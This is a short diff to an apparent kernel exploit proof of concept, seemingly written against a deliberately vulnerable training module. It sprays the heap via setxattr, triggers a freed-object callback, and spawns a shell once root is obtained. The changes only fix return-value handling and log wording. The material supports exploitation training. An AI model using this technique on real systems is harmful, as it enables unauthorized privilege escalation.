@@ -141,6 +141,7 @@ int act(int act_fd, int code, int n, char *args)
 
 int main(void)
 {
+	int result = EXIT_FAILURE;
 	char *spray_data = NULL;
 	int ret = EXIT_FAILURE;
 	int act_fd = -1;
@@ -195,7 +196,7 @@ int main(void)
 	printf("[+] DRILL_ACT_FREE\n");
 
 	ret = setxattr("./", "foobar", spray_data, PAYLOAD_SZ, 0);
-	printf("setxattr returned %d\n", ret);
+	printf("[+] setxattr is called (returned %d)\n", ret);
 
 	if (act(act_fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
 		goto end;
@@ -203,8 +204,8 @@ int main(void)
 
 	if (getuid() == 0 && geteuid() == 0) {
 		printf("[+] finish as: uid=0, euid=0, start sh...\n");
+		result = EXIT_SUCCESS;
 		run_sh();
-		ret = EXIT_SUCCESS;
 	} else {
 		printf("[-] heap spraying\n");
 	}
@@ -222,5 +223,5 @@ end:
 			perror("[-] close act_fd");
 	}
 
-	return ret;
+	return result;
 }
